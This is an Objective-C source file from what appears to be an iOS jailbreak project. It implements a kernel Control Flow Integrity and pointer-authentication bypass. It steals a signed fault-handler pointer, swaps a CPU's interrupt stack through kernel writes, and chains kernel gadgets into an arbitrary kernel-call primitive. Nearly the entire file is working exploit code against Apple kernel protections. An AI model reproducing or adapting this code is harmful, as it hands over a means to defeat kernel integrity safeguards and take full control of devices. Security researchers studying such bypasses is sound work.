//
//  badRecovery.m
//  badRecovery
//
//  Created by Lars Fröder on 25.01.24.
//

#import <Foundation/Foundation.h>

#include "badRecovery.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <ptrauth.h>
#include <IOKit/IOKitLib.h>

#include <libjailbreak/primitives.h>
#include <libjailbreak/translation.h>
#include <libjailbreak/info.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/util.h>

#define guard(cond) if (__builtin_expect(!!(cond), 1)) {}
#define DBGPRINT_ADDRVAR(var) printf("[DBG] %s: %s @ %p\n", __func__, #var, (void*) var)
#define DBGPRINT_VAR(var)     printf("[DBG] %s: %s: %p\n", __func__, #var, (void*) (uint64_t) var)
#define MEMORY_BARRIER asm volatile("dmb sy");

void pac_exploit_thread(void);
void pac_exploit_doIt(void);
void pac_loop(void);

uint64_t mapKernelPage(uint64_t addr);
uint64_t getUserReturnThreadContext(void);

exploitThreadInfo fugu15ExploitThread;
Fugu14KcallThread fugu14KcallThread;
uint64_t stack[1024];

uint64_t ensureSpecialMem(uint64_t cur)
{
    uint64_t mapped = cur;
    while (mapped == 0 || kvtophys(mapped + 0x4000ULL)) {
        if (kalloc_with_options(&mapped, 0x4000, KALLOC_OPTION_LOCAL) != 0) {
            puts("[-] ensureSpecialMem: Failed to allocate");
            break;
        }
    }
    return mapped;
}

/*
 * This function breaks Control Flow Integrity by obtaining
 * a signed thread fault handler address to an unprotected ret.
 *
 * Unprotected handlers can be found in xnu/osfmk/arm64/machine_routines_asm.s
 * See label 9 in both hw_lock_trylock_mask_allow_invalid and hw_lck_ticket_reserve_orig_allow_invalid
 *
 * (This implementation targets hw_lck_ticket_reserve_orig_allow_invalid)
 */
bool breakCFI(void)
{
    
    // Get this thread
    uint64_t thisThread = kread_ptr(task_self() + koffsetof(task, threads));
    //uint64_t thisThread = portKObject()
    guard (thisThread != 0) else {
        puts("[-] breakCFI: Failed to find this thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(thisThread);
    
    // Create a new thread
    thread_t chThread = 0;
    bzero(&fugu15ExploitThread.gExploitThreadState, sizeof(fugu15ExploitThread.gExploitThreadState));
    
    uint64_t thStack = ((uint64_t) &stack[512]) & ~0xFULL;
    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_thread);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_constant((void*) 0x41424344, ptrauth_key_function_pointer, 0));
    
    fugu15ExploitThread.gExploitThreadState.__x[20] = (uint64_t) mach_host_self();
    fugu15ExploitThread.gExploitThreadState.__cpsr = 0;
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT, &chThread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] breakCFI: Failed to create thread!");
        return false;
    }
    
    // Find it
    uint64_t chThreadPtr = task_get_ipc_port_kobject(task_self(), chThread);
    
    guard (chThreadPtr != 0) else {
        puts("[-] breakCFI: Failed to find child thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(chThreadPtr);
    
    // Create another thread
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    arm_thread_state64_t other;
    memcpy(&other, &fugu15ExploitThread.gExploitThreadState, sizeof(other));
    
    uint64_t returnThreadACTContext = getUserReturnThreadContext();
    guard (returnThreadACTContext != 0) else {
        puts("[-] breakCFI: getUserReturnThreadContext failed!");
        return false;
    }
    
    fugu15ExploitThread.gReturnContext = returnThreadACTContext;

    // Map exploit thread
    uint64_t mapAddr = mapKernelPage(chThreadPtr);
    guard (mapAddr != 0) else {
        puts("[-] breakCFI: Failed to map thread!");
        return false;
    }
    
    uint64_t signedFaultHandler = 0;
    while ((signedFaultHandler | 0xFFFFFF8000000000ULL) != kgadget(hw_lck_ticket_reserve_orig_allow_invalid_signed)) {
        signedFaultHandler = *(volatile uint64_t*)(mapAddr + koffsetof(thread, recover));
    }
    
    puts("[+] breakCFI: Obtained signed fault handler!!!");
    
    DBGPRINT_ADDRVAR(signedFaultHandler);
    
    // Capture some cpu_data struct
    uint64_t cpuData = 0;
    while (cpuData == 0) {
        cpuData = *(uint64_t*)(mapAddr + koffsetof(thread, machine_CpuDatap));
    }
    
    fugu15ExploitThread.gCPUData = cpuData;
    
    // Allocate a new interrupt stack for that CPU
    uint64_t intStack = 0;
    if (kalloc_with_options(&intStack, 0x4000 * 4, KALLOC_OPTION_LOCAL) != 0) {
        puts("[-] breakCFI: Failed to allocate interrupt stack");
        return false;
    }
    intStack += 0x8000;
    fugu15ExploitThread.gIntStack = intStack;
    
    fugu15ExploitThread.gOrigIntStack = kread64(cpuData + 0x10ULL);
    
    DBGPRINT_ADDRVAR(fugu15ExploitThread.gOrigIntStack);
    
    // Replacing the interrupt stack *should* be safe, unless:
    // 1. Something is running on the old interrupt stack AND
    // 2. That code causes a synchronous exception
    // (Which never happens)
    kwrite64(cpuData + 0x10ULL, intStack);
    kwrite64(cpuData + 0x18ULL, intStack);
    
    DBGPRINT_ADDRVAR(intStack);
    
    // Suspend and abort the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Our gadgets
    uint64_t brx22           = kgadget(br_x22); // Weird gadget, first signs x22, then jumps to it
    uint64_t signGadget      = ksymbol(hw_lck_ticket_reserve_orig_allow_invalid) + 4;
    uint64_t exceptionReturn = ksymbol(exception_return);
    
    // Set new state
    // This state will be reflected in the kernel
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0x4142434400ULL | i;
    }
    
    uint64_t origACT = *(uint64_t*)(mapAddr + koffsetof(thread, machine_contextData));
    fugu15ExploitThread.gACTPtr = chThreadPtr + koffsetof(thread, machine_contextData);
    fugu15ExploitThread.gACTVal = origACT;
    
    fugu15ExploitThread.gExploitThreadState.__x[10] = origACT;  // ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[11] = mapAddr;
    fugu15ExploitThread.gExploitThreadState.__x[16] = chThreadPtr - koffsetof(thread, recover) + koffsetof(thread, machine_contextData); // Restore ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[17] = brx22;
    
    fugu15ExploitThread.gSpecialMemRegion = ensureSpecialMem(fugu15ExploitThread.gSpecialMemRegion);
    
    fugu15ExploitThread.gExploitThreadState.__x[18] = fugu15ExploitThread.gSpecialMemRegion + 0x4000ULL - 0x140ULL;
    fugu15ExploitThread.gExploitThreadState.__x[19] = intStack + 0x3FF0ULL;
    fugu15ExploitThread.gExploitThreadState.__x[20] = cpuData;
    fugu15ExploitThread.gExploitThreadState.__x[21] = returnThreadACTContext;
    fugu15ExploitThread.gExploitThreadState.__x[22] = exceptionReturn;
    fugu15ExploitThread.gExploitThreadState.__x[23] = -1;
    fugu15ExploitThread.gExploitThreadState.__x[25] = koffsetof(thread, machine_CpuDatap);
    fugu15ExploitThread.gExploitThreadState.__x[26] = koffsetof(thread, machine_kstackptr);
    fugu15ExploitThread.gExploitThreadState.__x[27] = koffsetof(thread, machine_contextData);

    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, 0x414243441DULL);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, 0x414243441EULL);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_doIt);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_unauthenticated((void*) signGadget, ptrauth_key_function_pointer, 0));
    
    // Set thread fault handler
    kwrite64(chThreadPtr + koffsetof(thread, recover), signedFaultHandler);

    puts("GO!");
    
    // Set state and wait for boom!
    thread_set_state(chThread, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(chThread);
    
    uint64_t brx22Handler = 0;
    uint64_t datStack = 0;
    while ((brx22Handler | 0xFFFFFF8000000000ULL) != kgadget(br_x22)) {
        brx22Handler = *(volatile uint64_t*)(mapAddr + koffsetof(thread, recover));
        if (datStack == 0) {
            datStack = *(volatile uint64_t*)(mapAddr + koffsetof(thread, machine_kstackptr));
        }
    }
    
    puts("[+] breakCFI: Obtained signed br x22 fault handler!!!");
    DBGPRINT_ADDRVAR(datStack);
    
    // Stop the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Set new thread fault handler
    kwrite64(chThreadPtr + koffsetof(thread, recover), brx22Handler);
    
    kalloc(&fugu15ExploitThread.gScratchMemKern, 0x8000);
    fugu15ExploitThread.gScratchMemMapped   = (void *)mapKernelPage(fugu15ExploitThread.gScratchMemKern);
    fugu15ExploitThread.gReturnValMemMapped = (void *)mapKernelPage(fugu15ExploitThread.gScratchMemKern + 0x4000) + 0x3FF8;
    fugu15ExploitThread.gExploitThread = chThread;
    fugu15ExploitThread.inited = true;
    
    gPrimitives.kcall = fugu15_kcall;
    
    return true;
}

void deinitFugu15PACBypass(void)
{
    if (fugu15ExploitThread.inited) {
        fugu15ExploitThread.inited = false;
        
        kwrite64(fugu15ExploitThread.gCPUData + 0x10ULL, fugu15ExploitThread.gOrigIntStack);
        kwrite64(fugu15ExploitThread.gCPUData + 0x18ULL, fugu15ExploitThread.gOrigIntStack);
    }
}

/*
 * Execute the given CPU state.
 */
void fugu15_kexec_on_thread(exploitThreadInfo *info, kRegisterState *state)
{
    uint64_t ldp_x0_x1       = kgadget(ldp_x0_x1_x8);
    uint64_t exceptionReturnAfterCheck = kgadget(exception_return_after_check);
    uint64_t exceptionReturnNoLR = kgadget(exception_return_after_check_no_restore);
    uint64_t str_x8_x9 = kgadget(str_x8_x9);

    uint64_t realStateKern    = info->gScratchMemKern + 0x10 + (sizeof(kRegisterState) * 2);
    kRegisterState *realState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + (sizeof(kRegisterState) * 2));
    memcpy(realState->x, state->x, sizeof(state->x));
    
    realState->sp = info->gIntStack + 0x3000 - 0x10;
    realState->fp = state->fp;

    uint64_t restoreACTStateKern    = info->gScratchMemKern + 0x10 + sizeof(kRegisterState);
    kRegisterState *restoreACTState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + sizeof(kRegisterState));
    restoreACTState->x[0]  = realStateKern;
    restoreACTState->x[1]  = state->pc;
    restoreACTState->x[2]  = state->cpsr;
    restoreACTState->x[3]  = state->lr;
    restoreACTState->x[8]  = info->gACTVal;
    restoreACTState->x[9]  = info->gACTPtr;
    restoreACTState->x[22] = 0;
    restoreACTState->x[23] = 0;
    restoreACTState->sp    = info->gScratchMemKern;

    kRegisterState *state1 = (kRegisterState*) &info->gScratchMemMapped[2];
    state1->x[0]  = restoreACTStateKern;
    state1->x[1]  = str_x8_x9;
    state1->x[2]  = CPSR_KERN_INTR_DIS;
    state1->x[3]  = exceptionReturnAfterCheck;
    state1->x[22] = 0;
    state1->x[23] = 0;
    state1->sp    = info->gScratchMemKern;

    info->gScratchMemMapped[0] = info->gScratchMemKern + 0x10;    // x0 -> Our first new context
    info->gScratchMemMapped[1] = exceptionReturnAfterCheck; // x1 -> PC

    // Now do an arbitrary kcall
    // Using the br x22 handler, first jump to our ldp x0, x1 gadget
    // Then return into the middle of exception_return, right after authenticating the thread state
    info->gExploitThreadState.__x[2]  = CPSR_KERN_INTR_DIS; // CPSR
    info->gExploitThreadState.__x[3]  = 0;                  // FPSR
    info->gExploitThreadState.__x[4]  = 0;                  // FPCR
    info->gExploitThreadState.__x[8]  = info->gScratchMemKern; // For the ldp x0, x1, [x8] gadget
    info->gExploitThreadState.__x[22] = ldp_x0_x1;
    arm_thread_state64_set_lr_fptr(info->gExploitThreadState, ptrauth_sign_unauthenticated((void*)exceptionReturnNoLR, ptrauth_key_function_pointer, 0));
    
    info->gSpecialMemRegion = ensureSpecialMem(info->gSpecialMemRegion);
    
    info->gExploitThreadState.__x[16] = state->x[16];
    info->gExploitThreadState.__x[17] = state->x[17];
    info->gExploitThreadState.__x[18] = info->gSpecialMemRegion + 0x4000ULL - 0x140ULL;

    thread_set_state(info->gExploitThread, ARM_THREAD_STATE64, (thread_state_t) &info->gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(info->gExploitThread);
}


uint64_t fugu15_kcall_on_thread(exploitThreadInfo *info, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
{
    uint64_t exceptionReturn    = ksymbol(exception_return);
    uint64_t str_x0_x19_ldr_x20 = kgadget(str_x0_x19_ldr_x20);
    
    kRegisterState kcallState;
    
    kcallState.x[0] = a1;
    kcallState.x[1] = a2;
    kcallState.x[2] = a3;
    kcallState.x[3] = a4;
    kcallState.x[4] = a5;
    kcallState.x[5] = a6;
    kcallState.x[6] = a7;
    kcallState.x[7] = a8;
    
    kcallState.x[19] = info->gScratchMemKern + 0x7FF8; // Where x0 should be stored
    kcallState.x[20] = 0x0;             // Invalid address
    kcallState.x[21] = info->gReturnContext;  // Userspace context
    kcallState.x[22] = exceptionReturn; // br x22 gadget
    kcallState.x[23] = -1;              // Required for br x22 gadget
    
    kcallState.pc = func;
    kcallState.lr = str_x0_x19_ldr_x20; // This will crash (intended) and then continue via br x22 fault handler
    kcallState.cpsr = CPSR_KERN_INTR_DIS;

    fugu15_kexec_on_thread(info, &kcallState);
    
    *info->gReturnValMemMapped = 0xDEADBEEFCAFEBABEULL;
    uint64_t set = 0xDEADBEEFCAFEBABEULL;
    uint64_t res = set;
    while (res == set) {
        res = *info->gReturnValMemMapped;
    }
    
    // Stop the thread
    thread_suspend(info->gExploitThread);
    thread_abort(info->gExploitThread);

    return res;
}

uint64_t fugu15_kcall(uint64_t func, int argc, const uint64_t *argv)
{
    if (argc > 8) return 0;
    uint64_t a1 = argc >= 1 ? argv[0] : 0;
    uint64_t a2 = argc >= 2 ? argv[1] : 0;
    uint64_t a3 = argc >= 3 ? argv[2] : 0;
    uint64_t a4 = argc >= 4 ? argv[3] : 0;
    uint64_t a5 = argc >= 5 ? argv[4] : 0;
    uint64_t a6 = argc >= 6 ? argv[5] : 0;
    uint64_t a7 = argc >= 7 ? argv[6] : 0;
    uint64_t a8 = argc >= 8 ? argv[7] : 0;
    return fugu15_kcall_on_thread(&fugu15ExploitThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

void fugu15_kexec(kRegisterState state)
{
    fugu15_kexec_on_thread(&fugu15ExploitThread, &state);
}

bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread)
{
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, thread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] kexec_on_new_thread: Failed to create new thread!");
        return false;
    }
    
    thread_suspend(*thread);
    thread_abort(*thread);
    
    uint64_t threadPtr = task_get_ipc_port_kobject(task_self(), *thread);
    guard (threadPtr != 0) else {
        puts("[-] kexec_on_new_thread: Failed to find new thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(threadPtr);
    
    kRegisterState *threadACTContext = (kRegisterState*) kread_ptr(threadPtr + koffsetof(thread, machine_contextData));
    guard (threadACTContext != NULL) else {
        puts("[-] kexec_on_new_thread: New thread has no ACT_CONTEXT?!");
        return false;
    }
    
    // Write new state (only important stuff)
    size_t sizeToWrite = offsetof(kRegisterState, other[0]) - offsetof(kRegisterState, x[0]);
    kwritebuf((uint64_t) &threadACTContext->x[0], &kState->x[0], sizeToWrite);
    
    // Resign it
    kcall(NULL, ksymbol(ml_sign_thread_state), 6, (uint64_t[]){(uint64_t) threadACTContext, kState->pc, kState->cpsr, kState->lr, kState->x[16], kState->x[17]});
    
    // Resume
    thread_resume(*thread);
    
    return true;
}


int exploit_init(const char *flavor)
{
    if (!breakCFI()) return -1;
    fugu14_kcall_init(^int(mach_port_t threadPort) {
        return sign_kernel_thread(proc_self(), threadPort);
    });
    deinitFugu15PACBypass();
    return 0;
}

int exploit_deinit(void)
{
    return 0;
}
